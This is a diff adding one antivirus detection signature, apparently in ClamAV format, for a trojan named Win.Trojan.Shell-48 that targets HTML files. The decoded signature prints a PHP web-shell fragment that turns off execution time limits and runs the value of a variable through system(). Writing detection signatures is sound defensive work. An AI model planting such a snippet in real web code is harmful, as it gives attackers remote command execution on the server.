@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Shell-48
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+<?php echo\"himaster!\";ini_set(\"max_execution_time\",0);system(\$suntzu);?>
